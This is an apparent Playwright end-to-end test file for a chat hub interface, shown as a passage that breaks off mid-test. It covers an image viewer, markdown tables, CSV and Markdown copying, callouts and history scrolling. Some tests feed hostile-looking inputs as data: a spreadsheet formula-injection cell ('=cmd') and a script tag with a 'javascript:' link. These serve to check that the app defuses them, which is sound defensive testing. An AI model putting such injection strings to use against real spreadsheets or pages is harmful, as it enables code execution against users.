import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { inflateSync } from "node:zlib";
import { test, expect, journeyPart } from "./journey";
import type { DoubleOptions } from "./hub-double";
import { journeyDay } from "./clock";
import { ATLAS, PELICAN } from "./world";
import { openConversation, showConversationList } from "./responsive-goals";

const you = (id: number, text: string, at: string) => ({ notification_id: id, target: PELICAN, text, state: "acknowledged", stamped: true, device_id: "journey-device", operator_label: "Daniel", at });
const sup = (id: number, replyTo: number, message: string, at: string, attachments: unknown[] = []) => ({ notification_id: id, reply_to: replyTo, message, summary: "", device_id: "journey-device", kind: "answer", attachments, at });
const file = (artifact_id: string, name: string) => ({ artifact_id, name, mime: "application/pdf", size_bytes: 88_064, sha256: "9f".repeat(32) });

test("HUB-J4 inspect images in a turn without leaving the conversation", journeyPart, async ({ page, journey }, testInfo) => {
  const hub = await journey.hub({ machines: [ATLAS], paired: ["atlas"] });
  const imageBytes = readFileSync("e2e/media/evidence.png");
  await page.route("https://atlas.test/v1/sessions/*/artifacts/*/content?*", route => route.request().url().includes("gallery-missing")
    ? route.fulfill({ status: 404 }) : route.fulfill({ contentType: "image/png", body: imageBytes }));
  await page.context().route("https://store.test/**", route => route.fulfill({ contentType: "image/png", body: imageBytes }));
  await journey.open(); await openConversation(page, "cas-src");
  const images = ["First screenshot.png", "Second screenshot.png", "Missing screenshot.png"].map((name, index) => ({ ...file(["gallery-first", "gallery-second", "gallery-missing"][index]!, name), mime: "image/png" }));
  hub.supervisorSays(PELICAN, "Compare these screenshots.", { attachments: images });
  hub.supervisorSays(PELICAN, "This image belongs to another turn.", { attachments: [{ ...images[0], artifact_id: "gallery-other", name: "Other turn.png" }] });
  const first = page.getByRole("log").getByRole("link", { name: /^First screenshot.png/ });
  await expect(first.locator("img")).toBeVisible();
  const captures = testInfo.outputPath("image-viewer"); mkdirSync(captures, { recursive: true });
  await journey.stage("Read the image cards in the conversation", async () => {
    for (const width of [390, 1440]) for (const colorScheme of ["light", "dark"] as const) {
      await page.setViewportSize({ width, height: 844 }); await page.emulateMedia({ colorScheme });
      await first.scrollIntoViewIfNeeded();
      await page.screenshot({ path: `${captures}/conversation-${width}-${colorScheme}.png` });
    }
  });
  await journey.stage("Repeated viewer load failures leave one note", async () => {
    const chunk = /\/chunk-image-viewer-[^/]+\.js$/;
    await page.route(chunk, route => route.abort("failed"));
    for (let attempt = 0; attempt < 3; attempt++) {
      await first.click();
      await expect(first).toContainText("Image viewer unavailable. Try again.");
      expect.soft(await first.locator(".preview-note").count()).toBe(1);
    }
    for (const colorScheme of ["light", "dark"] as const) {
      await page.setViewportSize({ width: 390, height: 844 }); await page.emulateMedia({ colorScheme });
      await page.screenshot({ path: `${captures}/unavailable-390-${colorScheme}.png` });
    }
    await page.unroute(chunk);
    await page.reload(); await openConversation(page, "cas-src");
    await expect(first.locator("img")).toBeVisible();
  });
  const dialog = page.getByRole("dialog", { name: "Image viewer" });
  await journey.stage("Expand an image and keep keyboard focus inside", async () => {
    await first.focus(); await first.press("Enter");
    await expect(dialog).toBeVisible();
    await expect(page.locator("body")).toHaveCSS("margin", "0px");
    await expect(dialog.locator(".image-viewer-canvas")).toHaveCSS("display", "grid");
    await expect(dialog.getByRole("button", { name: "Close image viewer" })).toBeFocused();
    await expect(dialog).toContainText("1 of 3");
    await expect(dialog.locator("img")).toHaveAttribute("alt", "First screenshot.png");
    await expect(dialog).toHaveAttribute("data-state", "ready");
    await page.keyboard.press("Shift+Tab");
    await expect(dialog.getByRole("button", { name: "Fit image" })).toBeFocused();
    await page.keyboard.press("Tab");
    await expect(dialog.getByRole("button", { name: "Close image viewer" })).toBeFocused();
    for (const width of [390, 1440]) for (const colorScheme of ["light", "dark"] as const) {
      await page.setViewportSize({ width, height: 844 }); await page.emulateMedia({ colorScheme });
      await page.screenshot({ path: `${captures}/expanded-${width}-${colorScheme}.png` });
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
    }
    for (const [name, query, media] of [
      ["forced-colors", "(forced-colors: active)", { forcedColors: "active" }],
      ["reduced-motion", "(prefers-reduced-motion: reduce)", { reducedMotion: "reduce" }],
      ["contrast-more", "(prefers-contrast: more)", { contrast: "more" }],
    ] as const) {
      await page.emulateMedia({ forcedColors: null, reducedMotion: null, contrast: null });
      await page.emulateMedia(media);
      expect(await page.evaluate(query => matchMedia(query).matches, query)).toBe(true);
      await expect(dialog).toBeVisible();
      await page.screenshot({ path: `${captures}/a11y-${name}.png` });
    }
    await page.emulateMedia({ forcedColors: null, reducedMotion: null, contrast: null });
  });
  await journey.stage("Zoom and pan with keyboard, mouse and touch", async () => {
    // At 1440 the 640 px fixture still fits at 1.5×, so it has nothing to pan.
    await page.setViewportSize({ width: 390, height: 844 });
    const canvas = dialog.locator(".image-viewer-canvas");
    await page.keyboard.press("+");
    await expect(dialog.locator("output")).toHaveText("1.5×");
    await page.keyboard.press("Shift+ArrowRight");
    expect(await dialog.locator("img").evaluate(image => image.style.transform)).not.toContain("translate(0px, 0px)");
    await canvas.hover(); await page.mouse.wheel(0, -200);
    await expect(dialog.locator("output")).not.toHaveText("1.5×");
    const beforeDrag = await dialog.locator("img").evaluate(image => image.style.transform);
    const box = (await canvas.boundingBox())!;
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down(); await page.mouse.move(box.x + box.width / 2 + 40, box.y + box.height / 2); await page.mouse.up();
    expect(await dialog.locator("img").evaluate(image => image.style.transform)).not.toBe(beforeDrag);
    const beforePinch = await dialog.locator("output").textContent();
    await canvas.evaluate(canvas => {
      const box = canvas.getBoundingClientRect();
      const fire = (type: string, id: number, x: number) => canvas.dispatchEvent(new PointerEvent(type, { bubbles: true, cancelable: true, pointerType: "touch", pointerId: id, clientX: box.left + x, clientY: box.top + box.height / 2 }));
      fire("pointerdown", 1, 70); fire("pointerdown", 2, 170); fire("pointermove", 2, 210); fire("pointerup", 1, 70); fire("pointerup", 2, 210);
    });
    await expect(dialog.locator("output")).not.toHaveText(beforePinch!);
    await dialog.getByRole("button", { name: "Fit image" }).click();
    await expect(dialog.locator("output")).toHaveText("Fit");
  });
  await journey.stage("Compare the turn's images and name a load failure", async () => {
    await page.keyboard.press("ArrowRight");
    await expect(dialog.locator("h2")).toHaveText("Second screenshot.png");
    await expect(dialog).toHaveAttribute("data-state", "ready");
    await dialog.getByRole("button", { name: "Next image" }).click();
    await expect(dialog.getByRole("status", { name: "Image load" })).toContainText("Couldn't load Missing screenshot.png");
    const retry = dialog.getByRole("button", { name: "Try image again" });
    for (const colorScheme of ["light", "dark"] as const) {
      await page.setViewportSize({ width: 390, height: 844 }); await page.emulateMedia({ colorScheme });
      await expect(retry).toBeInViewport({ ratio: 1 });
      expect(await dialog.evaluate(node => node.scrollTop)).toBe(0);
      await page.screenshot({ path: `${captures}/failed-390-${colorScheme}.png` });
      await retry.click();
      await expect(dialog.getByRole("status", { name: "Image load" })).toContainText("Couldn't load Missing screenshot.png");
      await expect(dialog.getByRole("status", { name: "Image load" })).toHaveCount(1);
    }
    await expect(dialog.getByRole("button", { name: "Next image" })).toBeDisabled();
    await page.keyboard.press("ArrowLeft");
    await expect(dialog).toHaveAttribute("data-state", "ready");
    const reading = page.locator(".conversation-reading.thread");
    const scroll = await reading.evaluate(node => node.scrollTop);
    await page.keyboard.press("Escape");
    await expect(dialog).toHaveCount(0); await expect(first).toBeFocused();
    expect(await reading.evaluate(node => node.scrollTop)).toBe(scroll);
  });
});

test("HUB-J4 prose tables keep words readable and render inline markdown", journeyPart, async ({ page, journey }) => {
  const hub = await journey.hub({ machines: [ATLAS], paired: ["atlas"] });
  await journey.open();
  await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
  await expect(page.locator("#conversation-connection")).toContainText("Live");
  hub.supervisorSays(PELICAN, [
    "| Tab | State |", "| --- | --- |",
    "| **Daniel Open Hours** | Tracks *open hours* in `time-tracking`; [details](https://example.org/hours) stay available. |",
    "| Weekly summary | Ready after the current work session ends. |", "",
    "| # | What | Starts |", "| --- | --- | --- |",
    "| C2 | **Review the current changes** and record the remaining work. | After `C1` |",
    "| C3 | Publish the reviewed report when every check passes. | After C2 |",
  ].join("\n"));
  const tables = page.getByRole("log").getByRole("table");
  await expect(tables).toHaveCount(2);
  for (const width of [1280, 390]) for (const colorScheme of ["light", "dark"] as const) {
    await page.setViewportSize({ width, height: width === 390 ? 844 : 800 });
    await page.emulateMedia({ colorScheme });
    await journey.stage(`Read prose tables at ${width} in ${colorScheme}`, async () => {
      for (let index = 0; index < 2; index++) {
        const table = tables.nth(index);
        await table.scrollIntoViewIfNeeded();
        if (process.env.DELIVERY_QA) {
          mkdirSync(process.env.DELIVERY_QA, { recursive: true });
          await table.screenshot({ path: `${process.env.DELIVERY_QA}/table-${index + 2}-${width}-${colorScheme}.png` });
          writeFileSync(`${process.env.DELIVERY_QA}/table-${index + 2}.html`, `<!doctype html><html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>${readFileSync("dist/app.css", "utf8")}</style><body><div class="thread"><div class="bub">${await table.evaluate(node => node.outerHTML)}</div></div></body></html>`);
        }
        const rendered = await table.evaluate(node => {
          const cells = [...node.querySelectorAll<HTMLElement>('td')];
          // A word's Range stays on one line, including C2 in the three-column case.
          const words = cells.flatMap(cell => {
            const walker = document.createTreeWalker(cell, NodeFilter.SHOW_TEXT);
            const counts: number[] = [];
            for (let text = walker.nextNode(); text; text = walker.nextNode()) {
              for (const match of text.textContent!.matchAll(/[\p{L}\p{N}]+/gu)) {
                const range = document.createRange();
                range.setStart(text, match.index!); range.setEnd(text, match.index! + match[0].length);
                counts.push(range.getClientRects().length);
              }
            }
            return counts;
          });
          return {
            words, bold: node.querySelector("strong")?.textContent,
            code: node.querySelector("code")?.textContent,
            italic: node.querySelector("em")?.textContent,
            link: node.querySelector("a")?.getAttribute("href"),
            proseAlignment: getComputedStyle(cells[1]!).textAlign,
            proseFont: getComputedStyle(cells[1]!).fontFamily,
            bodyFont: getComputedStyle(document.querySelector(".bub")!).fontFamily,
            overflow: getComputedStyle(node.parentElement!).overflowX,
            right: node.getBoundingClientRect().right,
            pageWidth: document.documentElement.clientWidth,
            pageScrollWidth: document.documentElement.scrollWidth,
          };
        });
        expect.soft(rendered.words.every(count => count === 1), `words stay whole in ${index + 2} columns at ${width}`).toBe(true);
        expect.soft(rendered.bold).toBe(index === 0 ? "Daniel Open Hours" : "Review the current changes");
        expect.soft(rendered.code).toBe(index === 0 ? "time-tracking" : "C1");
        if (index === 0) {
          expect.soft(rendered.italic).toBe("open hours");
          expect.soft(rendered.link).toBe("https://example.org/hours");
        }
        expect.soft(rendered.proseAlignment).toBe("left");
        expect.soft(rendered.proseFont).toBe(rendered.bodyFont);
        expect.soft(rendered.overflow).toBe("auto");
        expect.soft(rendered.right).toBeLessThanOrEqual(rendered.pageWidth);
        expect.soft(rendered.pageScrollWidth).toBe(rendered.pageWidth);
      }
    });
  }
});

test("HUB-J4 copy real tables as Markdown and spreadsheet CSV", journeyPart, async ({ page, journey }) => {
  const hub = await journey.hub({ machines: [ATLAS], paired: ["atlas"] });
  const path = `src/${"a-long-path-segment/".repeat(8)}report.ts`;
  const markdown = `| Item | Note | Result |\r\n| --- | --- | --- |\r\n| \`a\\|b\` | said "ready", now | **pass** |\r\n| \`${path}\` | inspect [receipt](https://example.org/receipt) | 1 flake |`;
  await journey.open();
  await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
  await expect(page.locator("#conversation-connection")).toContainText("Live");
  hub.supervisorSays(PELICAN, `# Evidence ready to reuse\n\n${markdown}\n\n~~~txt\n| literal | source |\n| --- | --- |\n~~~`);
  const log = page.getByRole("log");
  const table = log.getByRole("table", { name: "Evidence", exact: true }).filter({ has: page.getByRole("columnheader", { name: "Item", exact: true }) });
  const sheet = table.locator("xpath=../..");
  await journey.stage("Read a native table with escaped pipes and copy its two formats", async () => {
    await expect(table).toHaveCount(1);
    await expect(table.getByRole("columnheader")).toHaveText(["Item", "Note", "Result"]);
    await expect(table.getByRole("cell").first()).toHaveText("a|b");
    await expect(log.locator(".code-frame code")).toHaveText("| literal | source |\n| --- | --- |");
    await expect(table.locator(".pass")).toHaveText("pass");
    await expect(table.locator(".flake")).toHaveText("1 flake");
    const copy = sheet.getByRole("button", { name: "Copy CSV", exact: true });
    await copy.focus(); await page.keyboard.press("Enter");
    await expect(sheet.getByRole("status")).toHaveText("CSV copied");
    const csv = await page.evaluate(() => navigator.clipboard.readText());
    expect(csv).toBe(`Item,Note,Result\r\na|b,"said ""ready"", now",pass\r\n${path},inspect receipt,1 flake`);
    await page.keyboard.press("Shift+Tab");
    await expect(sheet.getByRole("button", { name: "Copy Markdown", exact: true })).toBeFocused();
    await page.keyboard.press("Enter");
    await expect(sheet.getByRole("status")).toHaveText("Markdown copied");
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(markdown);
    if (process.env.TABLE_QA) {
      mkdirSync(process.env.TABLE_QA, { recursive: true });
      writeFileSync(`${process.env.TABLE_QA}/copied.csv`, csv);
    }
  });
  for (const width of [1280, 390]) for (const colorScheme of ["light", "dark"] as const) {
    await page.setViewportSize({ width, height: width === 390 ? 844 : 800 });
    await page.emulateMedia({ colorScheme });
    await journey.stage(`Read and copy a wrapping table at ${width} in ${colorScheme}`, async () => {
      await sheet.scrollIntoViewIfNeeded();
      expect(await table.evaluate(node => node.parentElement!.scrollWidth <= node.parentElement!.clientWidth + 1)).toBe(true);
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
      await expect(sheet.getByRole("button", { name: "Copy CSV", exact: true })).toBeVisible();
      if (process.env.TABLE_QA) {
        const dir = process.env.TABLE_QA;
        await page.screenshot({ path: `${dir}/table-${width}-${colorScheme}.png` });
        writeFileSync(`${dir}/final.aria.yml`, await sheet.ariaSnapshot());
        writeFileSync(`${dir}/table.html`, `<!doctype html><html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>${readFileSync("dist/app.css", "utf8")}</style><body><main class="thread"><div class="bub">${await sheet.evaluate(node => node.outerHTML)}</div></main></body></html>`);
      }
    });
  }
  await journey.stage("Read a short status table without folding plain progress into it (cas-2656)", async () => {
    const short = "| Name | Value |\r\n| --- | --- |\r\n| quoted | comma, \"quote\" 雪 |";
    hub.supervisorSays(PELICAN, "Checking evidence", { kind: "status" });
    hub.supervisorSays(PELICAN, short, { kind: "status" });
    const statusTable = log.getByRole("table").filter({ has: page.getByRole("columnheader", { name: "Name", exact: true }) });
    await expect(statusTable.getByRole("columnheader")).toHaveText(["Name", "Value"]);
    await expect(statusTable.getByRole("cell")).toHaveText(["quoted", 'comma, "quote" 雪']);
    await expect(log.locator(".coalesce")).toHaveText("Checking evidence");
    const controls = statusTable.locator("xpath=../..");
    await controls.getByRole("button", { name: "Copy CSV", exact: true }).focus();
    await page.keyboard.press("Enter");
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe('Name,Value\r\nquoted,"comma, ""quote"" 雪"');
    await controls.getByRole("button", { name: "Copy Markdown", exact: true }).click();
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(short);
  });
  await journey.stage("Copy formula-leading values safely while keeping the table and Markdown exact (cas-4800)", async () => {
    const source = "| Formula | Value |\n| --- | --- |\n| =cmd | @x |\n| +1 | -1 |";
    hub.supervisorSays(PELICAN, source);
    const formulas = log.getByRole("table").filter({ has: page.getByRole("columnheader", { name: "Formula", exact: true }) });
    const controls = formulas.locator("xpath=../..");
    await expect(formulas.getByRole("cell")).toHaveText(["=cmd", "@x", "+1", "-1"]);
    await controls.getByRole("button", { name: "Copy CSV", exact: true }).click();
    await expect(controls.getByRole("status")).toHaveText("CSV copied");
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe("Formula,Value\r\n'=cmd,'@x\r\n'+1,'-1");
    await expect(controls.getByRole("status")).toBeEmpty();
    await controls.getByRole("button", { name: "Copy Markdown", exact: true }).click();
    await expect(controls.getByRole("status")).toHaveText("Markdown copied");
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(source);
    await expect(controls.getByRole("status")).toBeEmpty();
    await expect(formulas.getByRole("cell")).toHaveText(["=cmd", "@x", "+1", "-1"]);
  });
  await journey.stage("Retry after clipboard refusal and read a headerless empty cell", async () => {
    await page.evaluate(() => { Object.defineProperty(navigator.clipboard, "writeText", { configurable: true, value: () => Promise.reject(new Error("Permission denied")) }); });
    const copy = sheet.getByRole("button", { name: "Copy CSV", exact: true });
    await copy.click();
    await expect(sheet.getByRole("status")).toContainText("Copy failed");
    await expect(copy).toBeEnabled();
    await page.evaluate(() => { Reflect.deleteProperty(navigator.clipboard, "writeText"); });
    await copy.click();
    await expect(sheet.getByRole("status")).toHaveText("CSV copied");
    hub.supervisorSays(PELICAN, "| first | |\n| second | value |", { kind: "status" });
    const headerless = log.getByRole("table").last();
    await expect(headerless.getByRole("columnheader")).toHaveCount(0);
    await expect(headerless.getByRole("cell")).toHaveText(["first", "", "second", "value"]);
    if (process.env.TABLE_QA) await page.screenshot({ path: `${process.env.TABLE_QA}/copy-recovery-headerless.png` });
  });
});

test("HUB-J4 a short status shows its callout and bold, not their markers", journeyPart, async ({ page, journey }, testInfo) => {
  const hub = await journey.hub({ machines: [ATLAS], paired: ["atlas"] });
  await journey.open();
  await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
  await expect(page.locator("#conversation-connection")).toContainText("Live");
  hub.supervisorSays(PELICAN, "> [!WARNING]\n> **Blocked:** the queue is red on two Commander journeys.", { kind: "status" });
  hub.supervisorSays(PELICAN, "**Merged.** Gate 11 of 14 is green and the release branch is ready for its next pass.", { kind: "status" });
  const log = page.getByRole("log");
  for (const width of [1280, 390]) for (const colorScheme of ["light", "dark"] as const) {
    await journey.stage(`Read the short status at ${width} in ${colorScheme}`, async () => {
      await page.setViewportSize({ width, height: width === 390 ? 844 : 800 });
      await page.emulateMedia({ colorScheme });
      const callout = log.getByRole("complementary", { name: "Warning", exact: true });
      await expect(callout).toContainText("Blocked: the queue is red");
      await expect(callout.locator("strong").last()).toHaveText("Blocked:");
      const line = log.locator(".coalesce");
      await expect(line.locator("strong")).toHaveText("Merged.");
      await expect(log).not.toContainText("**");
      await expect(log).not.toContainText("[!WARNING]");
      // Bold joins its sentence: one reading line, not a stacked box per run.
      const [bold, box] = await Promise.all([line.locator("strong").boundingBox(), line.boundingBox()]);
      expect(box!.height).toBeLessThan(3 * 24 + 20);
      expect(bold!.y - box!.y).toBeLessThan(16);
      await log.locator(".turn").filter({ has: page.getByRole("complementary", { name: "Warning", exact: true }) }).screenshot({ path: testInfo.outputPath(`status-callout-${width}-${colorScheme}.png`) });
      await line.screenshot({ path: testInfo.outputPath(`status-bold-${width}-${colorScheme}.png`) });
    });
  }
});

test("HUB-J4 headings and labeled caveats stay distinct from actionable cards", journeyPart, async ({ page, journey }) => {
  const hub = await journey.hub({ machines: [ATLAS], paired: ["atlas"] });
  await journey.open();
  await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
  await expect(page.locator("#conversation-connection")).toContainText("Live");
  hub.supervisorSays(PELICAN, [
    "# Release is ready", "## Evidence", "### Checks", "The reviewed build passed.",
    "> [!NOTE]", "> **Read** the [receipt](https://example.org/receipt).", ">", "> The evidence stays available.", "",
    "> [!WARNING]", "> Keep `rollback` available.", "",
    "> [!CAUTION]", "> <script>unsafe()</script> is literal; [unsafe](javascript:run) stays text.", "",
    "Ordinary prose continues here.",
  ].join("\n"));
  const bubble = page.getByRole("log").locator(".bub").filter({ hasText: "Release is ready" });
  await expect(bubble).toBeVisible();
  const modes = [
    { name: "light", colorScheme: "light", forcedColors: "none", reducedMotion: "no-preference", contrast: "no-preference" },
    { name: "dark", colorScheme: "dark", forcedColors: "none", reducedMotion: "no-preference", contrast: "no-preference" },
    { name: "forced-colors", colorScheme: "light", forcedColors: "active", reducedMotion: "no-preference", contrast: "no-preference" },
  ] as const;
  const cells = [
    ...[1280, 390].flatMap(width => modes.map(mode => ({ width, ...mode }))),
    { width: 390, ...modes[0], name: "reduced-motion", reducedMotion: "reduce" as const },
    { width: 390, ...modes[0], name: "contrast-more", contrast: "more" as const },
  ];
  for (const { width, name, ...media } of cells) {
    await page.setViewportSize({ width, height: width === 390 ? 844 : 800 });
    await page.emulateMedia(media);
    await journey.stage(`Read heading hierarchy and caveats at ${width} in ${name}`, async () => {
      await bubble.scrollIntoViewIfNeeded();
      if (name === "forced-colors") expect(await page.evaluate(() => matchMedia("(forced-colors: active)").matches)).toBe(true);
      if (name === "reduced-motion") expect(await page.evaluate(() => matchMedia("(prefers-reduced-motion: reduce)").matches)).toBe(true);
      if (name === "contrast-more") expect(await page.evaluate(() => matchMedia("(prefers-contrast: more)").matches)).toBe(true);
      if (process.env.HIERARCHY_QA) {
        mkdirSync(process.env.HIERARCHY_QA, { recursive: true });
        await bubble.screenshot({ path: `${process.env.HIERARCHY_QA}/hierarchy-${width}-${name}.png` });
        writeFileSync(`${process.env.HIERARCHY_QA}/hierarchy.html`, `<!doctype html><html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>${readFileSync("dist/app.css", "utf8")}</style><body><main class="thread"><div class="bub">${await bubble.innerHTML()}</div></main></body></html>`);
      }
      expect.soft(await bubble.getByRole("heading", { level: 1, name: "Release is ready" }).count()).toBe(1);
      expect.soft(await bubble.getByRole("heading", { level: 2, name: "Evidence" }).count()).toBe(1);
      expect.soft(await bubble.getByRole("heading", { level: 3, name: "Checks" }).count()).toBe(1);
      expect.soft(await bubble.getByRole("complementary", { name: "Note", exact: true }).count()).toBe(1);
      expect.soft(await bubble.getByRole("complementary", { name: "Warning", exact: true }).count()).toBe(1);
      expect.soft(await bubble.getByRole("complementary", { name: "Caution", exact: true }).count()).toBe(1);
      expect.soft(await bubble.locator("script, button, [role=alert], [role=status], .obj, .ask, .blocker").count()).toBe(0);
      expect.soft(await bubble.getByRole("link").count()).toBe(1);
      expect.soft(await bubble.locator("code").allTextContents()).toEqual(["rollback"]);
      expect.soft(await bubble.locator(":scope > p").last().textContent()).toBe("Ordinary prose continues here.");
      const layout = await bubble.evaluate(node => {
        const headings = [...node.querySelectorAll<HTMLElement>(".markdown-heading")].map(h => parseFloat(getComputedStyle(h).fontSize));
        const caveats = [...node.querySelectorAll<HTMLElement>(".markdown-callout")].map(c => ({
          background: getComputedStyle(c).backgroundColor,
          border: getComputedStyle(c).borderInlineStartStyle,
          width: parseFloat(getComputedStyle(c).borderInlineStartWidth),
        }));
        return { headings, caveats, width: document.documentElement.clientWidth, scroll: document.documentElement.scrollWidth };
      });
      expect.soft(layout.headings[0]).toBeGreaterThan(layout.headings[1] ?? Infinity);
      expect.soft(layout.headings[1]).toBeGreaterThan(layout.headings[2] ?? Infinity);
      expect.soft(layout.caveats).toHaveLength(3);
      for (const caveat of layout.caveats) {
        expect.soft(caveat.background).toMatch(/^rgba\([\d, ]+, 0\)$/);
        expect.soft(caveat.border).toBe("solid");
        expect.soft(caveat.width).toBeGreaterThan(0);
      }
      expect.soft(layout.scroll).toBe(layout.width);
    });
  }
});

function historyWorld(): DoubleOptions {
  return {
    machines: [ATLAS],
    paired: ["atlas"],
    history: {
      [PELICAN]: [
        // Enough of today to fill the thread, as a real one is when it has an earlier page.
        { has_earlier: true, next_before: 20, messages: [you(21, "Is the release ready to cut?", journeyDay(0, 0, 1)), you(23, "Post the notes when it's out.", journeyDay(0, 0, 3)), you(25, "And close the epic.", journeyDay(0, 0, 5))], replies: [sup(22, 21, "Yes. The gate is green on the release branch.", journeyDay(0, 0, 2), [file("art-report", "Release report card.pdf"), file("art-local-draft", "Draft notes.pdf"), file("art-cloud-down", "Gate log.pdf"), file("art-offline", "Bench results.pdf")]), sup(24, 23, "Will do once the tag is pushed.", journeyDay(0, 0, 4)), sup(26, 25, "Closing it after the notes go out.", journeyDay(0, 0, 6))] },
        { has_earlier: true, next_before: 10, messages: [you(11, "Start the QA epic tomorrow morning.", journeyDay(1))], replies: [sup(12, 11, "Scheduled for 09:00 with three workers.", journeyDay(1, 12, 6))] },
        { has_earlier: false, messages: [you(1, "Draft the QA epic plan.", journeyDay(2, 6)), you(3, "Keep it to three lanes.", journeyDay(2, 6, 30))], replies: [sup(2, 1, "Drafted: three lanes, one gate.", journeyDay(2, 6, 6)), sup(4, 3, "Three lanes it is.", journeyDay(2, 6, 36))] },
      ],
    },
  };
}

test("HUB-J4 read the conversation history", async ({ page, journey }) => {
  const hub = await journey.hub(historyWorld());
  const log = page.getByRole("log");

  await journey.stage("Open the conversation and see the recent turns", async () => {
    await journey.open();
    await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
    await expect(log.getByText("Yes. The gate is green on the release branch.")).toBeVisible();
    await expect(log.getByText("Is the release ready to cut?")).toBeVisible();
    // cas-acb4b: the latest exchange is on screen at once, without Jump to latest.
    const newest = log.getByText("Closing it after the notes go out.");
    const jump = page.getByRole("button", { name: "Jump to latest" });
    /** The thread sits at its tail: nothing below the newest turn is out of view. */
    const atTail = () => page.evaluate(() => {
      const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
      return thread.scrollHeight - thread.clientHeight - thread.scrollTop <= 4;
    });
    // cas-c3ac: wait for initial font/layout delivery before introducing a
    // separate resize. The view's ResizeObserver and deferred pin must see
    // the initial geometry first; a fixed frame delay can precede that delivery.
    await page.evaluate(async () => {
      await document.fonts.ready;
      await new Promise<void>(resolve => {
        const observer = new ResizeObserver(() => {
          observer.disconnect();
          requestAnimationFrame(() => resolve());
        });
        observer.observe(document.querySelector(".conversation-reading.thread .msgs")!);
      });
    });
    await expect.poll(atTail, { message: "the thread opens at its latest turn" }).toBe(true);
    await expect(newest).toBeInViewport();
    await expect(jump).toBeHidden();
    // File cards that finish their layout late (an image, a font) grow the
    // thread after it was pinned to the tail. The thread keeps following it:
    // the newest turn stays on screen and the reader is not marked as having
    // scrolled away.
    const late = await page.addStyleTag({ content: '.msgs a[data-artifact-id] { min-height: 180px; } .msgs [data-key] { min-height: 140px; }' });
    // ResizeObserver and the view's deferred pin settle independently of a
    // fixed frame count. Wait for the same visible tail outcome as on entry.
    await expect.poll(atTail, { message: "late layout growth keeps the thread at its latest turn" }).toBe(true);
    await expect(newest).toBeInViewport();
    await expect(jump).toBeHidden();
    // A preview can collapse and grow again between scroll deliveries. Force
    // that real layout ordering: the browser clamps at the smaller height,
    // then queues a scroll which will see the larger content, without input.
    const clamp = await log.evaluate(node => {
      const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
      const content = node as HTMLElement;
      // Hide and restore the preview-bearing message list. The browser sees
      // the smaller intermediate layout; both final heights are identical.
      const display = content.style.display;
      const before = thread.scrollTop;
      content.style.display = "none";
      const clamped = thread.scrollTop; // force the collapsed layout
      content.style.display = display;
      return { before, clamped };
    });
    expect(clamp.clamped, "the collapsed layout actually clamps the scroll position").toBeLessThan(clamp.before);
    await expect.poll(atTail, { message: "a layout clamp followed by growth keeps following the latest turn" }).toBe(true);
    await expect(newest).toBeInViewport();
    await expect(jump).toBeHidden();
    // The rest of the journey reads the thread at its normal size.
    await late.evaluate((node) => (node as Element).remove());
  });

  /** Top of the first thread item on screen: the line the reader is on. */
  const reading = () => page.evaluate(() => {
    const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
    const top = thread.getBoundingClientRect().top;
    const node = [...thread.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.getBoundingClientRect().height > 0 && item.getBoundingClientRect().bottom > top)!;
    return { key: node.dataset.key!, y: Math.round(node.getBoundingClientRect().top) };
  });
  /** Load earlier keeps the reading position (journey F7): the turn the reader was on stays put. */
  const loadEarlierKeepsPlace = async (arrived: string, last = false) => {
    // The reader scrolls up to the button first, as a person does.
    await page.getByRole("button", { name: "Load earlier" }).scrollIntoViewIfNeeded();
    await page.evaluate(() => new Promise((ok) => requestAnimationFrame(() => requestAnimationFrame(ok))));
    const before = await reading();
    await page.getByRole("button", { name: "Load earlier" }).click();
    await expect(log.getByText(arrived)).toBeAttached();
    const y = () => page.evaluate((key) => {
      const node = [...document.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.dataset.key === key);
      return node ? Math.round(node.getBoundingClientRect().top) : NaN;
    }, before.key);
    if (last) {
      // cas-2093 (F12): on the last page the thread scrolls up just enough
      // to state the end of history at the top; the page the reader asked
      // for reads down from it to where they were.
      await expect(page.getByText("No earlier history")).toBeInViewport();
      expect(await y(), "the reader's turn is below the page they loaded, not above it").toBeGreaterThan(before.y);
      return;
    }
    await expect.poll(y, { message: `"${before.key}" stays where the reader left it` }).toBeGreaterThanOrEqual(before.y - 3);
    expect(await y()).toBeLessThanOrEqual(before.y + 3);
    // The older turns are above, off screen until the reader scrolls up.
    expect(await page.locator(".conversation-reading.thread").evaluate((thread) => thread.scrollTop)).toBeGreaterThan(0);
  };

  await journey.stage("Load earlier turns", async () => {
    await loadEarlierKeepsPlace("Scheduled for 09:00 with three workers.");
    await expect(log.getByText("Scheduled for 09:00 with three workers.")).toBeAttached();
    // The pointer now rests on the thread: its surface stays the cream canvas,
    // not brightened to white by the main-action button hover (journey F11).
    await log.hover();
    await expect(page.locator("#conversation-stage .conversation-thread-slot")).toHaveCSS("filter", "none");
